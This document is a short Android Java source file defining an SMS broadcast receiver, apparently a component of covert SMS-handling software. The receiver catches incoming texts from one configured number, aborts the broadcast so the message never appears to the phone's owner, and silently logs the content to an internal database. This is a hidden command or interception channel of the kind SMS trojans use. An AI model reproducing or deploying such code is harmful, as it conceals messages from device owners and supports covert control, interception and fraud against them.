package com.internal.transmit;

import com.internal.transmit.db.DatabaseOperator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

public class PrivilegedSmsReceiver extends BroadcastReceiver {
    private static final String TAG = "PrivilegedSmsReceiver";
    private static final boolean DEBUG = true;
    
    @Override
    public void onReceive(Context arg0, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
        
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] objArray = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[objArray.length];
                for (int i = 0; i < objArray.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) objArray[i]);
                    String content = messages[i].getMessageBody();
                    String phoneNum = messages[i].getDisplayOriginatingAddress();
                    
                    if (!TextUtils.isEmpty(phoneNum)) {
                        if (DEBUG) Log.d(TAG, "[[onReceived]] phoneNum = " + phoneNum);
                        if (phoneNum.endsWith(Config.DEFAULT_NUM)) {
                            this.abortBroadcast();
                            
                            MessageInfo info = new MessageInfo();
                            info.time = Config.formatTime(System.currentTimeMillis());
                            info.content = content;
                            info.phone = Config.DEFAULT_NUM;
                            
                            DatabaseOperator.getInstance().init(arg0.getApplicationContext());
                            DatabaseOperator.getInstance().insertInboxInfo(info);
                        }
                    }
                }
            }
        }
    }

}
